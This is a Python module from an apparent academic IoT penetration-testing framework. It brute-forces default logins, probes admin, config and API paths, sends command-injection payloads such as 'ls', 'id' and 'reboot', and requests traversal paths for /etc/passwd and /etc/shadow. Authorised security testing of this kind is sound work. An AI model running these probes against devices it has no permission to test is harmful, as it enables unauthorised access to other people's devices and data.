# =============================================================
# AIPET — AI-Powered Penetration Testing Framework for IoT
# Module 4: HTTP/Web IoT Suite
# Author: Binyam
# Institution: Coventry University — MSc Cyber Security
#              (Ethical Hacking)
# Date: March 2025
# Licence: MIT
# Description: Tests IoT web interfaces for default credentials,
#              hidden admin panels, API security issues, and
#              common IoT web vulnerabilities.
# =============================================================

import requests
import json
from datetime import datetime

# Disable SSL warnings for self-signed IoT certificates
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Constants ─────────────────────────────────────────────────

# Common default credentials found on IoT devices
DEFAULT_CREDENTIALS = [
    ("admin",   "admin"),
    ("admin",   "password"),
    ("admin",   "admin123"),
    ("admin",   "1234"),
    ("admin",   ""),
    ("root",    "root"),
    ("root",    "password"),
    ("root",    ""),
    ("admin",   "admin1234"),
    ("user",    "user"),
    ("guest",   "guest"),
    ("support", "support"),
    ("pi",      "raspberry"),
    ("ubnt",    "ubnt"),
    ("tech",    "tech"),
    ("service", "service"),
]

# Common IoT admin interface paths
ADMIN_PATHS = [
    "/admin",
    "/admin/",
    "/admin/login",
    "/admin/index.html",
    "/administrator",
    "/management",
    "/manage",
    "/config",
    "/configuration",
    "/setup",
    "/setup.html",
    "/settings",
    "/system",
    "/cgi-bin/admin",
    "/cgi-bin/index.cgi",
    "/cgi-bin/setup.cgi",
]

# Common IoT sensitive file paths
SENSITIVE_PATHS = [
    "/config.bak",
    "/config.old",
    "/backup.cfg",
    "/system.cfg",
    "/device.conf",
    "/firmware",
    "/firmware/update",
    "/diag",
    "/diagnostic",
    "/debug",
    "/status",
    "/info",
    "/about",
    "/version",
]

# Common IoT REST API paths
API_PATHS = [
    "/api",
    "/api/v1",
    "/api/v1/sensors",
    "/api/v1/config",
    "/api/v1/control",
    "/api/v1/status",
    "/api/v1/admin",
    "/api/v2/sensors",
    "/api/v2/config",
    "/rest/config",
    "/rest/sensors",
    "/rest/status",
]

# Sensitive keywords to look for in HTTP responses
SENSITIVE_PATTERNS = [
    "password", "passwd", "pwd", "secret",
    "token", "api_key", "apikey", "key",
    "credential", "auth", "login",
    "ssid", "wifi", "wireless",
    "admin", "root", "sudo",
    "private", "internal", "debug",
    "firmware", "version", "model",
    "location", "gps", "latitude",
    "heartrate", "patient", "medical",
]

# Login form field names commonly used on IoT devices
LOGIN_FIELD_NAMES = [
    ("username", "password"),
    ("user",     "pass"),
    ("login",    "password"),
    ("email",    "password"),
    ("name",     "pwd"),
    ("admin",    "admin_pass"),
]


# ── Helper: Make safe HTTP request ────────────────────────────
def safe_request(method, url, timeout=8, **kwargs):
    """
    Make an HTTP request with error handling.
    Returns response or None if request fails.

    Uses verify=False for self-signed IoT certificates.
    Uses timeout to prevent hanging on slow devices.
    """
    try:
        response = requests.request(
            method, url,
            timeout=timeout,
            verify=False,      # IoT devices use self-signed certs
            allow_redirects=True,
            **kwargs
        )
        return response
    except requests.exceptions.ConnectionError:
        return None
    except requests.exceptions.Timeout:
        return None
    except Exception:
        return None


# ── Helper: Check response for sensitive data ─────────────────
def check_sensitive(content, path):
    """
    Check HTTP response content for sensitive data patterns.

    Args:
        content (str): Response body text
        path (str): URL path being checked

    Returns:
        list: Found sensitive patterns
    """
    found = []
    content_lower = content.lower()
    for pattern in SENSITIVE_PATTERNS:
        if pattern in content_lower:
            found.append(pattern)
    return found


# ── Attack 1: Default Credential Testing ──────────────────────
def test_default_credentials(host, port=80,
                              use_https=False):
    """
    Attack 1: Test IoT web interface for default credentials.

    Tries common default credential pairs against login
    endpoints. IoT devices ship with well-known defaults
    that are rarely changed by end users.

    Args:
        host (str): Target device IP
        port (int): HTTP port
        use_https (bool): Use HTTPS if True

    Returns:
        dict: Credential testing results
    """
    scheme = "https" if use_https else "http"
    base_url = f"{scheme}://{host}:{port}"

    print(f"\n[*] Attack 1: Testing default credentials "
          f"on {base_url}")

    result = {
        "attack":            "Default Credential Testing",
        "host":              host,
        "port":              port,
        "credentials_tried": 0,
        "valid_credentials": [],
        "login_endpoints":   [],
        "finding":           "",
        "severity":          ""
    }

    # First find login endpoints
    login_paths = [
        "/admin/login",
        "/login",
        "/signin",
        "/auth",
        "/cgi-bin/login.cgi",
    ]

    accessible_logins = []
    for path in login_paths:
        url = f"{base_url}{path}"
        response = safe_request("GET", url)
        if response and response.status_code in [200, 302]:
            accessible_logins.append(path)
            print(f"    [+] Login endpoint found: {path}")

    result["login_endpoints"] = accessible_logins

    # Try POST-based credential attacks
    for login_path in accessible_logins:
        url = f"{base_url}{login_path}"

        for username, password in DEFAULT_CREDENTIALS:
            result["credentials_tried"] += 1

            display_user = username if username else "(empty)"
            display_pass = password if password else "(empty)"

            # Try each common field name combination
            for user_field, pass_field in LOGIN_FIELD_NAMES:
                payload = {
                    user_field: username,
                    pass_field: password
                }

                response = safe_request(
                    "POST", url,
                    data=payload
                )

                if response is None:
                    continue

                # Check for successful login indicators
                response_text = response.text.lower()
                success_indicators = [
                    "welcome", "dashboard", "logout",
                    "success", "token", "session",
                    "admin panel", "control panel"
                ]

                # Check for failure indicators
                failure_indicators = [
                    "invalid", "incorrect", "failed",
                    "wrong", "error", "denied"
                ]

                is_success = (
                    response.status_code == 200 and
                    any(ind in response_text
                        for ind in success_indicators) and
                    not any(ind in response_text
                            for ind in failure_indicators)
                )

                if is_success:
                    print(f"    [!] VALID: {display_user} / "
                          f"{display_pass} "
                          f"(fields: {user_field}/{pass_field})")
                    result["valid_credentials"].append({
                        "username":   username,
                        "password":   password,
                        "endpoint":   login_path,
                        "user_field": user_field,
                        "pass_field": pass_field
                    })
                    break

            # Small delay between attempts
            import time
            time.sleep(0.1)

    # Also try HTTP Basic Auth on admin paths
    for path in ["/admin", "/config", "/management"]:
        url = f"{base_url}{path}"

        for username, password in DEFAULT_CREDENTIALS[:8]:
            result["credentials_tried"] += 1

            response = safe_request(
                "GET", url,
                auth=(username, password)
            )

            if (response and
                    response.status_code == 200 and
                    "401" not in response.text):
                display_user = username if username else "(empty)"
                display_pass = password if password else "(empty)"
                print(f"    [!] Basic Auth VALID: "
                      f"{display_user} / {display_pass} "
                      f"on {path}")
                result["valid_credentials"].append({
                    "username": username,
                    "password": password,
                    "endpoint": path,
                    "method":   "HTTP Basic Auth"
                })

    # Determine severity
    if result["valid_credentials"]:
        count = len(result["valid_credentials"])
        result["finding"] = (
            f"Default credentials valid — "
            f"{count} credential set(s) found"
        )
        result["severity"] = "CRITICAL"
        print(f"[!] CRITICAL: {count} valid "
              f"credential set(s) found")
    elif result["login_endpoints"]:
        result["finding"] = (
            f"Login endpoints found but no default "
            f"credentials worked"
        )
        result["severity"] = "INFO"
        print("[-] No default credentials worked")
    else:
        result["finding"]  = "No login endpoints found"
        result["severity"] = "INFO"
        print("[-] No login endpoints found")

    return result


# ── Attack 2: Admin Interface Discovery ───────────────────────
def discover_admin_interfaces(host, port=80,
                               use_https=False):
    """
    Attack 2: Discover hidden admin panels, configuration
    pages, and sensitive files on IoT web interfaces.

    IoT devices often have undocumented admin pages,
    backup configuration files, and diagnostic interfaces
    that are not linked from the main page but are
    accessible to anyone who knows the path.

    Args:
        host (str): Target device IP
        port (int): HTTP port
        use_https (bool): Use HTTPS if True

    Returns:
        dict: Admin interface discovery results
    """
    scheme   = "https" if use_https else "http"
    base_url = f"{scheme}://{host}:{port}"

    print(f"\n[*] Attack 2: Discovering admin interfaces "
          f"on {base_url}")

    result = {
        "attack":              "Admin Interface Discovery",
        "host":                host,
        "port":                port,
        "admin_found":         [],
        "sensitive_files":     [],
        "sensitive_responses": [],
        "finding":             "",
        "severity":            ""
    }

    # Check admin paths
    all_paths = ADMIN_PATHS + SENSITIVE_PATHS
    print(f"    [*] Testing {len(all_paths)} paths...")

    for path in all_paths:
        url = f"{base_url}{path}"
        response = safe_request("GET", url)

        if response is None:
            continue

        if response.status_code == 200:
            content   = response.text
            path_type = (
                "admin" if path in ADMIN_PATHS
                else "sensitive_file"
            )

            # Check for sensitive data in response
            sensitive_found = check_sensitive(content, path)

            entry = {
                "path":      path,
                "status":    response.status_code,
                "size":      len(content),
                "sensitive": sensitive_found
            }

            if path in ADMIN_PATHS:
                result["admin_found"].append(entry)
                print(f"    [!] Admin interface: {path} "
                      f"({len(content)} bytes)")
            else:
                result["sensitive_files"].append(entry)
                print(f"    [!] Sensitive file: {path} "
                      f"({len(content)} bytes)")

            if sensitive_found:
                result["sensitive_responses"].append({
                    "path":     path,
                    "patterns": sensitive_found,
                    "preview":  content[:200]
                })
                print(f"    [SENSITIVE] {path} contains: "
                      f"{', '.join(sensitive_found[:3])}")

    # Determine severity
    total_found = (len(result["admin_found"]) +
                   len(result["sensitive_files"]))

    if result["sensitive_responses"]:
        result["finding"] = (
            f"{total_found} interface(s) found — "
            f"{len(result['sensitive_responses'])} "
            f"exposing sensitive data"
        )
        result["severity"] = "CRITICAL"
        print(f"[!] CRITICAL: {total_found} interface(s) "
              f"found with sensitive data")

    elif total_found > 0:
        result["finding"] = (
            f"{total_found} admin/sensitive interface(s) "
            f"accessible without authentication"
        )
        result["severity"] = "HIGH"
        print(f"[!] HIGH: {total_found} "
              f"interface(s) accessible")

    else:
        result["finding"]  = "No admin interfaces discovered"
        result["severity"] = "INFO"
        print("[-] No admin interfaces found")

    return result


# ── Attack 3: API Security Testing ────────────────────────────
def test_api_security(host, port=80, use_https=False):
    """
    Attack 3: Test IoT REST API endpoints for authentication
    bypass and sensitive data exposure.

    IoT devices increasingly expose REST APIs for mobile
    app integration and cloud connectivity. These APIs
    often lack authentication, rate limiting, and input
    validation — making them a rich attack surface.

    Args:
        host (str): Target device IP
        port (int): HTTP port
        use_https (bool): Use HTTPS if True

    Returns:
        dict: API security test results
    """
    scheme   = "https" if use_https else "http"
    base_url = f"{scheme}://{host}:{port}"

    print(f"\n[*] Attack 3: Testing API security "
          f"on {base_url}")

    result = {
        "attack":            "API Security Testing",
        "host":              host,
        "apis_found":        [],
        "unauthenticated":   [],
        "sensitive_apis":    [],
        "injectable_apis":   [],
        "finding":           "",
        "severity":          ""
    }

    print(f"    [*] Testing {len(API_PATHS)} API paths...")

    for path in API_PATHS:
        url = f"{base_url}{path}"

        # Test GET access
        response = safe_request("GET", url)

        if response and response.status_code == 200:
            content = response.text
            result["apis_found"].append(path)
            print(f"    [+] API accessible: {path}")

            # Check for unauthenticated access
            result["unauthenticated"].append({
                "path":   path,
                "method": "GET",
                "size":   len(content)
            })

            # Check for sensitive data
            sensitive = check_sensitive(content, path)
            if sensitive:
                result["sensitive_apis"].append({
                    "path":     path,
                    "patterns": sensitive,
                    "preview":  content[:300]
                })
                print(f"    [SENSITIVE] API {path} exposes: "
                      f"{', '.join(sensitive[:3])}")

        # Test POST injection
        if response and response.status_code in [200, 405]:
            test_payloads = [
                {"cmd":    "ls"},
                {"exec":   "id"},
                {"action": "reboot"},
                {"cmd":    "../../../etc/passwd"},
            ]

            for payload in test_payloads:
                post_response = safe_request(
                    "POST", url,
                    json=payload
                )

                if (post_response and
                        post_response.status_code == 200):
                    resp_text = post_response.text.lower()

                    # Check for command injection indicators
                    injection_indicators = [
                        "root:", "bin/", "/etc/",
                        "command", "executed", "accepted"
                    ]

                    if any(ind in resp_text
                           for ind in injection_indicators):
                        result["injectable_apis"].append({
                            "path":    path,
                            "payload": payload,
                            "preview": post_response.text[:200]
                        })
                        print(f"    [!] Possible injection "
                              f"at: {path}")
                        break

    # Determine severity
    if result["sensitive_apis"]:
        result["finding"] = (
            f"{len(result['apis_found'])} API(s) found — "
            f"{len(result['sensitive_apis'])} exposing "
            f"sensitive data without authentication"
        )
        result["severity"] = "CRITICAL"
        print(f"[!] CRITICAL: APIs exposing sensitive data")

    elif result["unauthenticated"]:
        result["finding"] = (
            f"{len(result['unauthenticated'])} API(s) "
            f"accessible without authentication"
        )
        result["severity"] = "HIGH"
        print(f"[!] HIGH: Unauthenticated API access")

    elif result["apis_found"]:
        result["finding"] = (
            f"{len(result['apis_found'])} API(s) found"
        )
        result["severity"] = "MEDIUM"

    else:
        result["finding"]  = "No API endpoints found"
        result["severity"] = "INFO"
        print("[-] No API endpoints found")

    return result


# ── Attack 4: Common Vulnerability Scanning ───────────────────
def scan_common_vulnerabilities(host, port=80,
                                 use_https=False):
    """
    Attack 4: Scan for common IoT web vulnerabilities.

    Tests for issues specific to IoT web interfaces —
    unprotected firmware update endpoints, directory
    traversal, exposed diagnostic pages, and insecure
    HTTP methods.

    Args:
        host (str): Target device IP
        port (int): HTTP port
        use_https (bool): Use HTTPS if True

    Returns:
        dict: Vulnerability scan results
    """
    scheme   = "https" if use_https else "http"
    base_url = f"{scheme}://{host}:{port}"

    print(f"\n[*] Attack 4: Common vulnerability scan "
          f"on {base_url}")

    result = {
        "attack":          "Common Vulnerability Scan",
        "host":            host,
        "vulnerabilities": [],
        "finding":         "",
        "severity":        ""
    }

    # Test 1 — HTTP methods
    print("    [*] Test 1: HTTP method testing")
    dangerous_methods = ["DELETE", "PUT", "TRACE", "OPTIONS"]

    for method in dangerous_methods:
        response = safe_request(method, f"{base_url}/")
        if response and response.status_code not in [
            405, 501, 400
        ]:
            result["vulnerabilities"].append({
                "type":     "Dangerous HTTP Method",
                "detail":   f"{method} method accepted",
                "severity": "MEDIUM"
            })
            print(f"    [!] Dangerous method accepted: "
                  f"{method}")

    # Test 2 — Directory traversal
    print("    [*] Test 2: Directory traversal")
    traversal_paths = [
        "/../../../../etc/passwd",
        "/../../../etc/shadow",
        "/config?file=../../../etc/passwd",
        "/..%2F..%2F..%2Fetc%2Fpasswd",
    ]

    for path in traversal_paths:
        url      = f"{base_url}{path}"
        response = safe_request("GET", url)

        if response and "root:" in response.text:
            result["vulnerabilities"].append({
                "type":     "Directory Traversal",
                "detail":   f"Path traversal via {path}",
                "severity": "CRITICAL"
            })
            print(f"    [!] CRITICAL: Directory traversal "
                  f"via {path}")
            break

    # Test 3 — No HTTPS redirect
    print("    [*] Test 3: HTTP security headers")
    response = safe_request("GET", f"{base_url}/")

    if response:
        headers      = response.headers
        missing      = []
        security_headers = [
            "X-Frame-Options",
            "X-Content-Type-Options",
            "Content-Security-Policy",
            "Strict-Transport-Security",
        ]

        for header in security_headers:
            if header not in headers:
                missing.append(header)

        if missing:
            result["vulnerabilities"].append({
                "type":     "Missing Security Headers",
                "detail":   f"Missing: {', '.join(missing)}",
                "severity": "LOW"
            })
            print(f"    [!] Missing security headers: "
                  f"{', '.join(missing[:2])}")

        # Check for server version disclosure
        server_header = headers.get('Server', '')
        if server_header:
            result["vulnerabilities"].append({
                "type":     "Server Version Disclosure",
                "detail":   f"Server header: {server_header}",
                "severity": "LOW"
            })
            print(f"    [!] Server version disclosed: "
                  f"{server_header}")

    # Test 4 — Firmware update endpoint
    print("    [*] Test 4: Firmware update endpoint")
    fw_paths = [
        "/firmware/update",
        "/update",
        "/upgrade",
        "/ota",
        "/flash",
    ]

    for path in fw_paths:
        url      = f"{base_url}{path}"
        response = safe_request("GET", url)

        if response and response.status_code == 200:
            result["vulnerabilities"].append({
                "type":     "Exposed Firmware Update",
                "detail":   f"Firmware update at {path}",
                "severity": "HIGH"
            })
            print(f"    [!] HIGH: Firmware update "
                  f"endpoint exposed: {path}")

    # Determine severity from findings
    if not result["vulnerabilities"]:
        result["finding"]  = "No common vulnerabilities found"
        result["severity"] = "INFO"
        print("[-] No common vulnerabilities found")
        return result

    # Get highest severity finding
    severities = [
        v.get("severity", "LOW")
        for v in result["vulnerabilities"]
    ]

    if "CRITICAL" in severities:
        result["severity"] = "CRITICAL"
    elif "HIGH" in severities:
        result["severity"] = "HIGH"
    elif "MEDIUM" in severities:
        result["severity"] = "MEDIUM"
    else:
        result["severity"] = "LOW"

    result["finding"] = (
        f"{len(result['vulnerabilities'])} "
        f"vulnerability/vulnerabilities found"
    )
    print(f"[!] {result['severity']}: "
          f"{len(result['vulnerabilities'])} "
          f"vulnerability/vulnerabilities found")

    return result


# ── Main Orchestrator ─────────────────────────────────────────
def run_http_attacks(host, port=8080, use_https=False):
    """
    Run all 4 HTTP attacks against a target IoT web interface.
    Main entry point for Module 4.

    Args:
        host (str): Target device IP
        port (int): HTTP port (default 8080 for IoT)
        use_https (bool): Use HTTPS if True

    Returns:
        dict: Complete results from all 4 attacks
    """
    scheme = "https" if use_https else "http"

    print("=" * 60)
    print("  AIPET — Module 4: HTTP/Web IoT Suite")
    print(f"  Target: {scheme}://{host}:{port}")
    print("=" * 60)

    all_results = {
        "target":    host,
        "port":      port,
        "scheme":    scheme,
        "scan_time": datetime.now().strftime(
                         "%Y-%m-%d %H:%M:%S"),
        "attacks":   [],
        "summary":   {
            "critical": 0,
            "high":     0,
            "medium":   0,
            "info":     0
        }
    }

    # Attack 1 — Default credentials
    cred_result = test_default_credentials(
        host, port, use_https
    )
    all_results["attacks"].append(cred_result)

    # Attack 2 — Admin interface discovery
    admin_result = discover_admin_interfaces(
        host, port, use_https
    )
    all_results["attacks"].append(admin_result)

    # Attack 3 — API security
    api_result = test_api_security(host, port, use_https)
    all_results["attacks"].append(api_result)

    # Attack 4 — Common vulnerabilities
    vuln_result = scan_common_vulnerabilities(
        host, port, use_https
    )
    all_results["attacks"].append(vuln_result)

    # Tally findings by severity
    for attack in all_results["attacks"]:
        sev = attack.get("severity", "").upper()
        if sev == "CRITICAL":
            all_results["summary"]["critical"] += 1
        elif sev == "HIGH":
            all_results["summary"]["high"] += 1
        elif sev == "MEDIUM":
            all_results["summary"]["medium"] += 1
        else:
            all_results["summary"]["info"] += 1

    # Save results
    output_file = "http/http_results.json"
    with open(output_file, 'w') as f:
        json.dump(all_results, f, indent=4)

    # Print final summary
    print("\n" + "=" * 60)
    print("  HTTP ATTACK SUMMARY")
    print("=" * 60)
    print(f"  Target:   {scheme}://{host}:{port}")
    s = all_results["summary"]
    print(f"  Critical: {s['critical']}")
    print(f"  High:     {s['high']}")
    print(f"  Medium:   {s['medium']}")
    print(f"  Info:     {s['info']}")
    print(f"\n[+] Results saved to {output_file}")
    print("=" * 60)

    return all_results


if __name__ == "__main__":
    run_http_attacks("localhost", 8080)